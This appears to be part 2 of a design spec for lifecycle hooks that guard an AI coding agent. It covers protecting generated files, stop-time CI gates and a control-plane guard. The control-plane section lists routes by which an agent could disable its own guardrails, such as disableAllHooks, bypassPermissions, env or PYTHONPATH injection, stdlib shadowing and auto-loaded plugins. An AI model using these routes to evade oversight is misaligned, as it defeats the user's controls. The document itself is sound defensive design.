# PR K — Lifecycle hooks (part 2): the standard hook pack and the new quality tools

> **Part 2 of PR K.** Part 1 is [`prK-lifecycle-hooks.md`](prK-lifecycle-hooks.md) and owns the mechanism (the canonical `Hook` artifact, configuration and trust, the adapters, the `playbook-hook` runtime), the locked decisions (§G), the invariants (§I), the SPEC amendments (§J) and the resolved open questions (§K). This part specifies what runs on that mechanism: the standard hook pack (§E), the four new quality tools (§F), their tracks K5–K10 and the rejected hooks (Appendix R).
>
> **Commit policy (overrides any tooling default):** commits authored **solely by `msobroza`** — no `Co-Authored-By`, no `--author`, no signing, no `git config` edits. Subagents `cd <worktree>` as their first tool call, default `opus`, **no `git push` / `gh pr create` until the user gate approves the diff**. Run the **full cache-free, no-optional-extras CI-parity gate** (`uv pip uninstall radon -y; rm -rf .mypy_cache; ruff check . && ruff format --check . && mypy && pytest -q`, no path args; invoke as `uv run python -m mypy` / `uv run python -m pytest -q` per CLAUDE.md) before claiming green — see [[ci-parity-gate-pitfalls]].

Section letters are shared across the two parts: §P, §A–§D, §G–§K live in [part 1](prK-lifecycle-hooks.md); §E, §F, Tracks K5–K10 and Appendix R live in [part 2](prK-hook-pack.md).

## Contents

1. [§E — The standard hook pack](#e--the-standard-hook-pack) — [E.0](#e0-organization) · [E.1](#e1-protect-the-playbook) · [E.2](#e2-verify-before-done) · [E.1/E.2 open questions](#e1e2-open-questions-and-flagged-divergences) · [E.3–E.5 notation](#notation-used-in-e3e5) · [E.3](#e3-rule-linked-edit-feedback) · [E.4](#e4-secrets-and-risky-actions) · [E.5](#e5-audit-and-overlay-mechanisms) · [E.3–E.5 open questions](#open-questions-raised-in-e3e5)
2. [§F — New tools from the user's notes: coverage, deterministic quality metrics, docstrings, commit names](#f--new-tools-from-the-users-notes-coverage-deterministic-quality-metrics-docstrings-commit-names) — [F.0](#f0-shared-groundwork-applies-to-f1f4) · [F.1](#f1-test-coverage) · [F.2](#f2-deterministic-code-quality-metrics) · [F.3](#f3-docstrings) · [F.4](#f4-commit-names-addendum-d-q2-d-q3) · [F.5](#f5-playbook-ci-the-aggregate-off-workstation-twin) · [F.6](#f6-files-new-unless-noted) · [F.7](#f7-spec-and-documentation-amendments) · [F.8](#f8-decisions-taken-in-f-with-rationale) · [F.9](#f9-open-questions)
3. [§H (pack tracks)](#h-pack-tracks) — [K5](#track-k5--pack-protect) · [K6](#track-k6--pack-verify-stop-coordinator-playbook-ci) · [K7](#track-k7--pack-feedback-and-the-shared-ruff-call) · [K8](#track-k8--pack-secrets-and-risky-actions) · [K9](#track-k9--pack-audit-and-overlay-mechanisms) · [K10](#track-k10--new-tools-coverage-quality-metrics-docstrings-commit-names)
4. [Appendix R — Rejected hooks](#appendix-r--rejected-hooks)

In [part 1](prK-lifecycle-hooks.md): [Goal](prK-lifecycle-hooks.md#goal) · [Context for fresh subagents](prK-lifecycle-hooks.md#context-for-fresh-subagents) · [§P](prK-lifecycle-hooks.md#p--prerequisites-track-p-lands-first) · [§A](prK-lifecycle-hooks.md#a--the-canonical-hook-artifact) · [§B](prK-lifecycle-hooks.md#b--configuration-trust-and-validation) · [§C](prK-lifecycle-hooks.md#c--rendering-hooks-per-harness-adapter-contract) · [§D](prK-lifecycle-hooks.md#d--the-playbook-hook-runtime) · [§G](prK-lifecycle-hooks.md#g--locked-decisions) · [§H (overview, P, K1–K4, K11)](prK-lifecycle-hooks.md#h--tracks) · [§I](prK-lifecycle-hooks.md#i--invariants-this-pr-must-honor) · [§J](prK-lifecycle-hooks.md#j--spec-amendment-table) · [§K](prK-lifecycle-hooks.md#k--open-questions-for-the-user-all-resolved)

## §E — The standard hook pack

The pack is the 38 non-rejected entries of the hook catalog, grouped into five families: **E.1 Protect the playbook** (8), **E.2 Verify before done** (7), **E.3 Feedback** (8), **E.4 Safety** (9) and **E.5 Audit & overlay** (6). This section fixes the pack-wide organization (E.0) and specifies E.1 and E.2 in full. E.3–E.5 follow the same entry format. The four new-scope tools (test coverage, deterministic quality metrics, docstrings, commit-message naming) and their 3 tool hooks are specified in §F. Where they run at Stop, they plug into the coordinator stages named in E.0.4: `coverage`, `quality-metrics` and `docstrings`. The 9 rejected catalog entries are in Appendix R.

### E.0 Organization

#### E.0.1 Every pack hook is a canonical `Hook` with a builtin handler

- **One artifact per catalog id.** Each hook is a `Hook` under `src/coding_agent_playbook/resources/hooks/`, authored as markdown plus static YAML frontmatter (L1). Ids are byte-identical to `catalog.json`. The body is the advisory paragraph that degrades into AGENTS.md / Continue output for harnesses without hooks.
- **Builtin handlers only.** Every engine-shipped pack handler is a builtin registered with `@register_hook_handler("<name>")` (entry-point group `coding_agent_playbook.hook_handlers`), following the §A.2 naming rule: snake_case, shareable across hooks, `<name>:<role>` for a companion on a second event (bound through the hook's `handlers` map, §A.2), e.g. `gate_weakening_guard:pre_edit`. For a one-hook handler the name is the hook id snake-cased (`guard_generated_outputs`); the decision log records `hook_id` separately. Handler modules live under `src/coding_agent_playbook/hook_runtime/handlers/` *(NEW)*; a module may hold several related handlers (e.g. `ruff_feedback.py`, §E.3) and files stay small. The engine ships no external-command handler, so the trust-on-first-use path (L1, L2) only ever applies to overlay and repo-local handlers.
- **Import discipline (L3), verified.** I checked imports on the worktree venv (CPython 3.13.9):
  - These load **without** jinja2: `commands.metrics`, `evals.task`, `evals.loader`, `evals.validator`, `detector` (but it imports `packaging`, `detector.py:14-15`), `lockfile`, `sources.filesystem` (yaml). A handler may import one in-process **only** as a row of §D.1's branch-local allow-list (cold branches, trigger-gated); never on the hot path.
  - These **pull jinja2**: `commands.validate`, `commands.check`, `commands.eval`, `orchestrator`, `renderer`.

  A handler that needs the second group runs it as a **child process** on the pinned interpreter (`<python> -I -m coding_agent_playbook.cli <subcommand>`; `cli.py` has a `__main__` guard). It never imports them. Where a handler needs logic that today lives inside a jinja2-importing module, that logic is first extracted into a jinja2-free helper (for example `lockfile.drift_entries`, E.1).

#### E.0.2 Tiers (preserved from the catalog)

| Tier | Shipped state | Who turns it on | Hooks |
| --- | --- | --- | --- |
| `default` | on in any repo that has enabled hooks | nobody; the user can disable per id in `[hooks]` (that key is guarded by control-plane-guard) | 26 |
| `opt-in` | shipped, off | the user, per id, in `[hooks]` | 9 |
| `overlay` | mechanism shipped `enabled: true` with inert data (`mode: off`, empty tables) and **not on**: `tier: overlay` is never in `[hooks] tiers` | a regulated overlay, by a same-id override that promotes it to `tier: default` (optionally `mandatory: true`) and supplies data (patterns, allowlists, mode) per L2 (§A.6, §E.5) | 3 |

- **"Default" never means "on after an engine upgrade".** Default-tier hooks run only in a repo that has opted into hooks through the `[hooks]` master switch, which `playbook init` writes (§B.1). An engine upgrade therefore never injects executable hooks into a repo that has not opted in.
- **Promotion needs evidence.** Moving a hook from opt-in to default, or an `ask` to a `deny`, requires both:
  - eval runs with and without the pack, through the existing runner (`playbook eval <id> --run`), including red-team tasks graded by `file_unchanged` + `answer_matches`;
  - override rates read from guard-decision-log.
- **Per-hook configuration.** Each hook is configured in `[hooks.<hook-id>]`, the consumer layer of its `handler.config` (§B.1: validated against the handler's `CONFIG_SCHEMA`, merged after repo-local with the §A.6 key policies). That is two TOML levels, which fits the `_dump_toml` limit. The merged config is baked into `guard_config.json` at sync, under `hooks.<hook-id>.handlers.<event>.config`. Hooks never read their commands or policy at run time from an agent-editable file. The documented exceptions are the `[metrics]`-reading stages (`quality-metrics`, `docstrings`, `coverage`), which read `[metrics]` live so they stay in parity with the `playbook-metrics` pre-commit hook (E.2, §F.0.2).

#### E.0.3 Catalog action → canonical decision

Hooks return only `deny | ask | context | none` (L6). A pass is always `none`, never `allow`. "Restore commands pass" and "escape hatch honored" both mean `none`.

| Catalog action | Decision | Claude Code rendering | OpenCode V1 shim (L5) |
| --- | --- | --- | --- |
| `block`, on `pre_tool_use` | `deny` | `hookSpecificOutput.permissionDecision: "deny"` | `throw` in `tool.execute.before`; the message reaches the model as the tool error |
| `block`, on `stop` / `subagent_stop` | `deny` (the stop is denied) | `{"decision":"block","reason":…}` as JSON on exit 0 | not blockable: `session.idle` is fire-and-forget, so the result is reported but cannot stop the turn (E.2) |
| `block`, on `user_prompt_submit` | `deny` | `decision: "block"` | not rendered in v1 (QC-2); advisory only |
| `ask` | `ask` | `permissionDecision: "ask"`; becomes `deny` headless (`claude -p`, the eval runners, CI) | becomes `deny` with the reason (OpenCode has no ask primitive) |
| `warn`, `inject_context` | `context` | `additionalContext` (PostToolUse, SessionStart), or one line in the combined Stop reason | text appended to `output.output` in `tool.execute.after`, or pushed through `experimental.chat.system.transform` |
| `log` | `none` | side effect only (decision log) | same |
| `auto_fix` | `none` (a silent side effect); `context` only when diagnostics remain after the fix | the handler writes the file after the edit; never `updatedInput` | same |

User-visible notes, such as `NOT verified` or a report of a loosened gate, are separate from the decision. They go to Claude's `systemMessage`. On OpenCode they travel in the wire `notice` field and are pushed into the next request's system context (§C.3.2, §D.6.4).

#### E.0.4 Shared dispatcher branches and the Stop stage order

There is one dispatcher process per harness event, and it fans out to the hooks in-process (L3). The work listed in the last column is done once per event and shared by every hook in the row.

| Event | Branch | Hooks fanned out | Shared once-per-event work |
| --- | --- | --- | --- |
| `pre_tool_use` | file-tool | guard-generated-outputs, control-plane-guard, secrets-path-guard, secret-content-guard, guard-eval-fixtures, prompt-write-scope-guard, ml-unsafe-deserialization-guard, `gate_weakening_guard:pre_edit` (gate-weakening-guard's companion), sensitive-data-read-guard | `guard_config.json` load; path normalization (repo-relative POSIX, case-folded on darwin/win32) |
| `pre_tool_use` | bash | destructive-command-guard, block-precommit-bypass, git-commit-push-policy-guard, commit-message-convention (§F.4), dependency-allowlist-guard, exfil-channel-guard, network-egress-guard, taint-escalation, command-convention-guard. The **write targets** it extracts are fed to the file-tool guards that own path policy | one shell-segment parse with wrapper unwrapping (`shell.parse_shell`, owned by §D.2.5), one git-argv parse (`gitargv.parse_git`) |
| `post_tool_use` | source-changed | validate-then-sync-on-canonical-edit, eval-task-authoring-lint, resync-on-detector-input-change | one matcher table, one 2s debounce per session, one ledger write |
| `post_tool_use` | python-edit | post-edit-ruff-format, error-handling-lint-feedback, typing-lint-feedback, pytest-conventions-feedback, `clean_code_metrics_nonregression:post_edit`, `docstring_nonregression:post_edit` (§F.3) | one ruff invocation (the §E.3 D1 call, whose buckets include the quality and docstring codes) |
| `post_tool_use`, `post_tool_use_failure` | ledger | the session ledger (touched paths; verify-command runs, green on `post_tool_use` and red on `_failure`, whose Bash error text begins `Exit code N`), toolchain-missing-hint, notebook-output-hygiene, local-audit-log, the taint-escalation marker | per-worktree state write |
| `stop` | coordinator | the stages in the table below | fingerprint, block budget, one combined reason |
| `subagent_stop` | coordinator, scoped | subagent-stop-verify | the same coordinator engine |
| `session_start` | briefing | session-start-playbook-briefing | TTL sweep of stale state |
| `user_prompt_submit` | prompt | pii-prompt-guard, the active-prompt record (shared by prompt-write-scope-guard and prompt-output-contract-on-stop) | none |
| `pre_compact` | none | precompact-checkpoint | none |
| every event | none | guard-decision-log (an in-process writer) | none |

**Stop coordinator stages.** The coordinator is the dispatcher's single Stop handler (L3). stop-ci-parity-gate owns its **policy**: fingerprint skip, block budget, combined reason and the "NOT verified" rule. Every other Stop hook registers as a named stage.

The stages run in the order below:
- Every **deterministic** stage runs, and all of them contribute to **one** combined reason per working-tree fingerprint, at most 40 lines.
- **Execution** stages run only when every deterministic stage is green **and** a user-local trust entry exists.

The stage names are the strings §F registers against. The order below is the engine constant `STOP_STAGE_ORDER` (shared name — proposed; §D.5.2); each Stop-stage hook declares only its stage name, in `handler.config.stage`, and `priority` plays no part. The cost classes mirror `evaluators/scope.py::CostTier` (`DETERMINISTIC < EXECUTION`) and the cheapest-first short-circuit of `evaluators/scheduler.py`.

| # | Stage | Owner | Cost | Tier | Contributes |
| --- | --- | --- | --- | --- | --- |
| 0 | `drift` | stop-drift-and-orphan-gate (E.1) | deterministic, about 0.1s | default | `deny` |
| 1 | `lint` | stop-ci-parity-gate (E.2) | deterministic, about 0.05s | default | `deny` (new findings only) |
| 2 | `quality-metrics` | clean-code-metrics-nonregression (E.2): the existing static metrics + `ruff_violations` (quality family, §F.2) | deterministic, 0.1–1s | default | `deny` if the repo gates metrics in pre-commit, else `context` |
| 3 | `docstrings` | docstring-nonregression (§F.3): `ruff_violations` restricted to D1xx | deterministic | default | as `quality-metrics` |
| 4 | `gate-integrity` | gate-weakening-guard (E.2) | deterministic, about 0.1s | default | `deny`, plus a user note on any loosening |
| 5 | `secrets` | stop-diff-sweep (E.4) | deterministic, 0.05–0.5s | default | `deny` |
| 6 | `notebooks` | notebook-output-hygiene (E.3) | deterministic | opt-in | `context` |
| 7 | `verify-claim` | stop-ci-parity-gate (E.2) | deterministic, under 10ms | default | `deny` |
| 8 | `output-contract` | prompt-output-contract-on-stop (E.2) | under 10ms | opt-in | `context` (deny-once is configurable) |
| 9 | `tests-nudge` | tests-with-source-nudge (E.2); runs only when stages 0–7 are green | 0.1–0.3s | opt-in | `context` |
| 10 | `typecheck` | stop-ci-parity-gate (E.2) | execution | opt-in + trust | `deny` |
| 11 | `tests` | stop-ci-parity-gate (E.2) | execution | opt-in + trust | `deny` |
| 12 | `coverage` | coverage-diff-gate (§F.1) | execution | opt-in + trust | `deny` (configurable `context`) |

#### E.0.5 Pack-wide conventions (each entry relies on these)

- **Output caps.**
  - A deny reason is at most 4 lines. It names the safe alternative and never teaches a bypass.
  - The Stop reason is at most 40 lines.
  - Post-edit diagnostics cover changed lines only: at most 8 per edit, deduplicated per session.
  - Session-start output is the heartbeat line plus anomalies only, at most 600 characters.
  - Every hook is silent on success.
- **Escape hatches.** The hatches are `PLAYBOOK_HOOKS=off`, `PLAYBOOK_HOOKS_DISABLE`, `PLAYBOOK_GATE=off` and `PLAYBOOK_ALLOW_GENERATED_EDIT=1`. They are read only from the hook process environment, never from a command's env prefix. Because Claude copies settings-file `env` keys into every hook process, a hatch whose value comes from a settings file's `env` object is ignored and reported (§D.7).
- **Failure classes.**
  - *Guard*: an internal error returns `ask` (`deny` headless).
  - *Quality*: fails open, with one note per session.
  - *Stop stage*: fails open but always emits `NOT verified`; a stage never reports green on an error.
  - In Claude Code a missing interpreter or a timeout always fails open. That is why `playbook-hook doctor` and the briefing heartbeat exist.
- **State.** Hook state lives under `git rev-parse --git-path playbook-hooks`: per worktree, mode 0700, never committed, keyed by `session_id` or tree id. Stale state is TTL-swept at `session_start`.
- **No repo-controlled code without user-local trust.** This covers pytest and conftest, mypy plugins, Jinja templates, and tool binaries the agent can overwrite. `guard_config.json` holds only the machine-independent stage record (logical tool name, args, timeouts); the absolute tool path and its stat signature are pinned per worktree in `machine.json` at every write-mode sync (§D.8.3 invariant). A stage whose tool signature changed is skipped with `NOT verified`.
- **Data, not instructions.** Repo-derived strings (paths, branch names, commit subjects) are sanitized (control characters and newlines stripped, length capped) and quoted as data.
- **Shared `guard_config.json` tables used by E.1/E.2** *(shared names — proposed; §D.8 owns the file's envelope and hash)*:

| Key | Content | Rendered at sync from |
| --- | --- | --- |
| `sentinel` | the exact sentinel string | `renderer.SENTINEL` (`renderer.py:43`); never hand-copied |
| `protected` | `entries[{path, kind, artifact_id, source, scope}]`, `output_dirs[]`, `hook_artifacts[]`, `resource_roots[]` | the sync's written set, which equals the lockfile entries plus `.coding-agent-playbook.lock` (P4: `LockEntry.source` + `artifact_id`; `scope` is set for managed settings elements, §B.6); each enabled adapter's `_output_directories()` (repo-relative); `resource_roots` as **package-relative identifiers** (`pkg:coding_agent_playbook/resources`, `pkg:<overlay>/resources`), which the runtime resolves through `machine.json.resource_roots` (§D.8.3) — never absolute site-packages paths |
| `control_plane` | settings paths, config paths, policy key paths, MCP paths | engine constants; overlays may only add rows (L2) |
| `precommit` | `playbook_hook_ids[]` | a regex scan of `.pre-commit-config.yaml` for ids starting `playbook-` or `coding-agent-playbook-` |
| `facts` | a subset of detector facts plus the dependency-name set | `detector.detect()` (`detector.py:288`) |
| `applicability` | `[{kind, id, applies_if, source}]` for every resolved rule, prompt and hook | `SyncContext` `*_resolved` (`orchestrator.py:220`) |
| `stop_gate` | `stages[{name, owner, cost, tool, args, timeout_s, needs_diff, mode}]` (machine-independent; absolute argv and stat signatures live in `machine.json`), `budget_s`, `max_blocks`, `verify_commands[]`, `claim_patterns[]` | `[hooks.stop-ci-parity-gate]`, detector `dev_tools`, the consumer's `repo: local` pre-commit hooks |
| `prompts` | `slash → {id, output_contract[]}` | resolved prompts |
| `eval` | `fixture_globs[]` (default `**/eval_tasks/*/setup/**`) | an engine constant shared with ml-unsafe-deserialization-guard and the metrics targets |

#### E.0.6 Summary of the selected pack

"Decision" applies the E.0.3 mapping. Latency figures are the catalog budgets; the hot-path p95 target is at most 100ms per event, all guards included. §F adds its own new-scope hooks (coverage, quality-metrics extension, docstrings, commit-message naming); they are listed in §F, not here.

| # | id | Group | Event(s) | Action → decision | Tier | Latency budget |
| --- | --- | --- | --- | --- | --- | --- |
| 1 | guard-generated-outputs | Protect | pre_tool_use | block → deny | default | ≤100ms p95 per Edit/Write; no subprocess |
| 2 | control-plane-guard | Protect | pre_tool_use | block → deny / ask | default | ≤100ms, only on edits to control-plane files |
| 3 | stop-drift-and-orphan-gate | Protect | stop (`drift`) | block → deny | default | about 0.1s fast path; slow path 0.5s+ when inputs changed |
| 4 | validate-then-sync-on-canonical-edit | Protect | post_tool_use | warn → context | default | about 0.4s validate plus child-process start, per canonical edit |
| 5 | resync-on-detector-input-change | Protect | post_tool_use | inject_context → context | default | about 5ms when deps unchanged; about 0.5s when the applicable set changes |
| 6 | session-start-playbook-briefing | Protect | session_start | inject_context → context | default | ≤300ms per start, resume or compaction |
| 7 | eval-task-authoring-lint | Protect | post_tool_use | warn → context | default | 0.5–1s per task.toml edit |
| 8 | guard-eval-fixtures | Protect | pre_tool_use | ask → ask | opt-in | about 0.05s (path match) |
| 9 | stop-ci-parity-gate | Verify | stop (coordinator; `lint`, `verify-claim`, `typecheck`, `tests`) | block → deny | default | about 60ms on an unchanged tree; ≤3s default stages; execution stages tens of seconds |
| 10 | clean-code-metrics-nonregression | Verify | stop (`quality-metrics`); post_tool_use companion (ruff C901/PLR codes in the shared D1 call) | block → deny / context | default (companion opt-in) | 0.1–1s at Stop when .py files were touched; about 0 extra per edit (companion shares D1) |
| 11 | block-precommit-bypass | Verify | pre_tool_use | block → deny | default | ≤100ms p95; early exit for non-git commands |
| 12 | gate-weakening-guard | Verify | stop (`gate-integrity`); pre_tool_use companion | block → deny; companion ask | default | about 100ms per Stop with a diff; 50–100ms per test-file edit |
| 13 | tests-with-source-nudge | Verify | stop (`tests-nudge`) | warn → context | opt-in | 0.1–0.3s, only on Stops with a src diff |
| 14 | subagent-stop-verify | Verify | subagent_stop | block → deny | opt-in | seconds per editing subagent; tens of seconds with execution stages |
| 15 | prompt-output-contract-on-stop | Verify | stop (`output-contract`) | warn → context | opt-in | under 10ms |
| 16 | post-edit-ruff-format | Feedback | post_tool_use | auto_fix → none (context when diagnostics remain) | default | 50–150ms per .py edit |
| 17 | ml-unsafe-deserialization-guard | Feedback | pre_tool_use | block → deny | default | 50–150ms per .py edit (one ast.parse), applies_if-gated |
| 18 | error-handling-lint-feedback | Feedback | post_tool_use | warn → context | default | about 0 extra (shares the ruff call) |
| 19 | typing-lint-feedback | Feedback | post_tool_use | warn → context | default | about 0 extra (shared ruff call plus one ast.parse) |
| 20 | pytest-conventions-feedback | Feedback | post_tool_use | warn → context | default | about 0 extra; about 10ms for the opt-in AST checks |
| 21 | prompt-write-scope-guard | Feedback | pre_tool_use (+ a user_prompt_submit record) | block → deny | default | under 1ms with no scope; ≤100ms with one |
| 22 | toolchain-missing-hint | Feedback | post_tool_use (+ _failure) | inject_context → context | default | under 1ms extra |
| 23 | notebook-output-hygiene | Feedback | post_tool_use; stop (`notebooks`) | warn → context | opt-in | 5–50ms per notebook edit |
| 24 | secrets-path-guard | Safety | pre_tool_use | block → deny | default | ≤100ms p95 per file-tool or Bash call |
| 25 | secret-content-guard | Safety | pre_tool_use | block → deny | default | under 5ms scan; ≤100ms p95 per write; push scan 10–500ms |
| 26 | destructive-command-guard | Safety | pre_tool_use | block → deny | default | ≤100ms p95 plus 5–20ms on git segments |
| 27 | git-commit-push-policy-guard | Safety | pre_tool_use | block → deny | default | about 50ms prefilter; 150–250ms on commit/push/PR/config |
| 28 | stop-diff-sweep | Safety | stop (`secrets`) | block → deny | default | 50–500ms per Stop with changes |
| 29 | dependency-allowlist-guard | Safety | pre_tool_use | block → deny | default | 30–100ms, only on installs and manifest edits |
| 30 | exfil-channel-guard | Safety | pre_tool_use | ask → ask | default | under 1ms extra; plus about 5ms for `git remote get-url` |
| 31 | taint-escalation | Safety | post_tool_use mark; pre_tool_use | ask → ask | opt-in | under 1ms extra |
| 32 | command-convention-guard | Safety | pre_tool_use | warn → context | opt-in | under 1ms extra |
| 33 | guard-decision-log | Audit | every dispatcher (in-process) | log → none | default | 1–2ms per decision |
| 34 | local-audit-log | Audit | post_tool_use (+ session/prompt metadata) | log → none | opt-in | about 0 async; 30–60ms sync |
| 35 | precompact-checkpoint | Audit | pre_compact | log → none | opt-in | 100–300ms per compaction |
| 36 | pii-prompt-guard | Overlay | user_prompt_submit | block → deny (fail-closed) | overlay | under 5ms plus 30–50ms start, once per prompt |
| 37 | network-egress-guard | Overlay | pre_tool_use | block → deny | overlay | under 1ms extra; plus about 5ms for `git remote get-url` |
| 38 | sensitive-data-read-guard | Overlay | pre_tool_use | ask → ask | overlay | under 1ms extra; 5–50ms for capped notebook parses |

The nine `rejected` catalog entries are listed with one-line reasons in Appendix R. §F adds 3 tool hooks (`coverage-diff-gate`, `docstring-nonregression`, `commit-message-convention`), for 41 hooks in total.

#### E.0.7 Entry format

Each entry has the same parts:
- a header line: `tier · event(s) · matcher · decision`;
- **Behavior**: condensed from the catalog, with the critic-adopted changes;
- **Implementation**: builtin handler, the engine code it reuses (real paths) and its `guard_config.json` keys;
- **Budget & failure**;
- **Guards**;
- **Portability**;
- **Off-workstation twin**;
- **Tests**: hermetic cases.

Tests live in `tests/hooks/test_<hook_id_snake>.py` *(NEW)*. Each test drives the handler through `playbook-hook simulate <event>` with golden per-harness payloads from `tests/fixtures/hook_payloads/{claude_code,opencode}/<event>/` (the one fixture root, served by the root `hook_payload` fixture, §D.9), using tmp git repos (real local `git`, as `tests/cli/test_metrics.py` already does). External tools (ruff, mypy, pytest) sit behind a named `FakeStageRunner` *(shared name — proposed)*, plus an autouse `subprocess.run`/`shutil.which` stub, so no tool binary is needed in CI.

### E.1 Protect the playbook

These hooks keep the playbook's own invariants true while the agent works:
- one canonical source, overridden by id (SPEC §11.2);
- drift fails (SPEC §12.3);
- user-owned guardrail config;
- eval fixtures and task schema stay valid.

#### guard-generated-outputs — Deny hand-edits to generated files; redirect to the canonical source

`default` · `pre_tool_use` · Edit|Write|MultiEdit|NotebookEdit on an existing protected path, plus Bash write targets · `deny`

- **Behavior.**
  - **Normalization.** The path is normalized to repo-relative POSIX and case-folded on darwin/win32, so `.Claude/CLAUDE.md` matches.
  - **When a path is protected.** Either of these holds:
    - (a) It is a `protected.entries` path or `.coding-agent-playbook.lock`. This check is authoritative, and it is the only one that covers SKILL.md files and byte-copied skill scripts and references, which carry no sentinel.
    - (b) It is an existing file carrying `sentinel` at its anchored position, for every adapter: line 1, or the first body line after a leading frontmatter block (agent_harness output, and Claude commands that carry `disallowed-tools` frontmatter, §C.4.3) — the P3 `has_sentinel` rule. Never a substring match, because `renderer.py`, `SPEC.md` and `tests/harness/fixtures` contain the literal.
  - **Exclusions.**
    - Paths whose lock entries are all scoped (the managed elements of `.claude/settings.json`, §B.6) are skipped here; control-plane-guard owns them (§C.1.4 agrees).
    - Creating a new path passes.
  - **Installed resources.** Paths under `protected.resource_roots` (site-packages `resources/**`) are always denied.
  - **The deny reason (at most 4 lines).**
    - It names the kind and id, plus `LockEntry.artifact_id` and `source`.
    - If the source is under `playbook/`, it says to edit that file.
    - If the source is an engine or overlay resource, it says to add a same-id override under `playbook/{rules,prompts,skills}/` (repo-local wins, SPEC §11.2), never touching site-packages.
    - It always ends with `then run playbook validate && playbook sync` (the next sync would silently overwrite a hand edit).
    - Multi-source outputs (`.claude/CLAUDE.md`, `AGENTS.md`) get `generated from rules; edit playbook/rules/<id> (ids: playbook check)`. There is no heading heuristic.
    - Hook artifacts (`protected.hook_artifacts`: everything under `.coding-agent-playbook/hooks/` — `guard_config.json` and the copied scripts — the rendered launcher, and `.opencode/plugins/playbook-hooks.js`) get `ask the user` instead of remediation steps, so the guard never teaches the bypass.
  - **What passes (`none`).**
    - Restore commands: `playbook sync`, `playbook init`, and `git checkout|restore -- <generated>`.
    - Read-only shell use: `cp AGENTS.md /tmp/x` passes, because only write targets are checked.
  - **Escape hatch.** `PLAYBOOK_ALLOW_GENERATED_EDIT=1` is honored from the hook process env only.
- **Implementation.**
  - Builtin handler `guard_generated_outputs` in `hook_runtime/handlers/guard_generated_outputs.py`.
  - It uses the shared helper `protected_paths(cfg) -> ProtectedSet` *(NEW, `hook_runtime/protected.py`; reused by control-plane-guard and stop-drift-and-orphan-gate)*.
  - Bash write targets come from §D.2.5's `shell.write_targets`: redirect targets, `tee`, `sed -i` / `perl -pi`, `cp`/`mv` destinations, and `rm`/`truncate` operands.
  - It never shells out to `playbook render --show-source`: that would render agent-written templates through the unsandboxed `jinja2.Environment` (`renderer.py:78`) and costs about 0.5s.
  - Prerequisites (P3, P4): `LockEntry` gains `source` + `artifact_id` (`lockfile.py:20-24`, schema bump of `_LOCKFILE_SCHEMA`, `commands/sync.py:35`); the sentinel wording is reconciled. `renderer.py:43` emits `AUTOGENERATED by coding-agent-playbook — edit in source, run 'playbook sync'`, while SPEC §4.3 and CLAUDE.md quote `# AUTOGENERATED — edit in coding-agent-playbook, …`.
  - Keys read: `sentinel`, `protected.*`, the hook's `config.restore_commands`.
- **Budget & failure.**
  - Budget: ≤100ms p95; the stdlib path measured 50–90ms. The deny path adds no subprocess.
  - Guard class: an internal error returns `ask` (`deny` headless).
  - A missing `guard_config.json` returns `ask` once per session, with `run playbook sync`.
  - Shell parsing errs toward false negatives; the `drift` stage is the backstop.
- **Guards.** Stateless and deterministic. Restore commands always pass, so the agent can undo its own edit.
- **Portability.**
  - Claude: PreToolUse on `Edit|Write|MultiEdit|NotebookEdit` and `Bash`. File-tool denies are a **boundary**; Bash parsing is a **speed bump**.
  - OpenCode: `tool.execute.before` on `edit|write|bash` (plus shim-extracted `apply_patch` targets, L5), which throws on deny.
  - Hookless harnesses: the Hook body renders an AGENTS.md paragraph ("generated files are read-only; edit `playbook/…` or override by id; then `playbook validate && playbook sync`").
- **Off-workstation twin.** `playbook sync --check`, run as the `playbook-sync-check` pre-commit hook (`.pre-commit-hooks.yaml`) or `coding-agent-playbook-sync` (`resources/precommit/config.yaml.j2`), and in CI.
- **Tests.**
  - Edit `.claude/CLAUDE.md`: deny, and the reason names `playbook/rules`.
  - Edit `.claude/skills/demo/SKILL.md` and `scripts/run.py`: deny via the lockfile, with no sentinel present.
  - `.Claude/CLAUDE.md` with `sys.platform` patched to darwin: deny.
  - New `.claude/commands/new.md`: none.
  - `renderer.py` (contains the literal): none.
  - `echo x > AGENTS.md`: deny. `cp AGENTS.md /tmp/x`: none.
  - `PLAYBOOK_ALLOW_GENERATED_EDIT=1 sed -i s/a/b/ AGENTS.md` (env prefix): deny. The same edit with the variable set in the hook env: none.
  - Edit `.coding-agent-playbook/hooks/guard_config.json`: deny, and the reason says `ask the user` and contains no remediation command.
  - Claude command `.claude/commands/review.md` with frontmatter and the sentinel on its first body line: deny.
  - Edit a user hook entry in `.claude/settings.json`: none here (it is control-plane-guard's).

#### control-plane-guard — Stop the agent disabling or rewriting its own guardrails

`default` · `pre_tool_use` · Edit|Write|MultiEdit on control-plane paths, plus Bash writes to them (including `bash -c` wrapping), `claude mcp add`, and pty-wrapped or stdin-piped `playbook sync` · `deny` / `ask`

- **Behavior.** The handler simulates the edit in memory, parses the file before and after, and diffs them. The verdict depends on the target:

| Target | `deny` | `ask` | `none` |
| --- | --- | --- | --- |
| `.claude/settings.json`; the **effective** `.claude/settings.local.json`; `${CLAUDE_CONFIG_DIR:-~/.claude}/settings*.json` (JSON diff). The local file's location is resolved at sync and at dispatch: since Claude Code 2.1.211 it lives at the git repo root — the **main checkout** root for a linked worktree, outside the worktree — except outside git, when the repo root is `$HOME`, on Windows, or on an ownership mismatch, where it is worktree-local | removing or changing a managed playbook element (a hook registration or a managed `permissions`/`sandbox` string, lockfile-tracked, §B.6); setting `disableAllHooks`; any `env` change (PLAYBOOK_* hatches, `PYTHONPATH`/`PYTHONSTARTUP` injection; a speed bump, §D.7); `permissions.defaultMode: "bypassPermissions"`; `enableAllProjectMcpServers` | new `permissions.allow` entries; adding or enabling an MCP server; `enabledPlugins` / `extraKnownMarketplaces` additions | the user's own hooks, `model`, other keys |
| `.coding-agent-playbook/hooks/**`, `.claude/hooks/playbook/**` and `.opencode/plugins/playbook-hooks.js` | **new** files not in the lockfile (an agent-created `fnmatch.py` would shadow stdlib inside the guard) | none | none (existing generated files belong to guard-generated-outputs) |
| other hook carriers (all speed bumps): creating or editing a `hooks:` frontmatter key in `.claude/{skills,commands,agents}/**` (registered when the skill/command/subagent runs, which the agent can trigger); new files under `.claude/skills/*/.claude-plugin/**` or any `**/hooks/hooks.json` (skills-dir plugins); new files in `.opencode/plugin/`, `.opencode/plugins/`, `.opencode/tool/`, `.opencode/tools/` (auto-loaded with no trust prompt, and able to mutate `output.args` after the shim's check) | none | any such creation or edit | other edits |
| `.mcp.json`; the `mcp` and `plugin` keys of `opencode.json(c)`; Bash `claude mcp add` | none | adding or enabling a server or plugin | other edits |
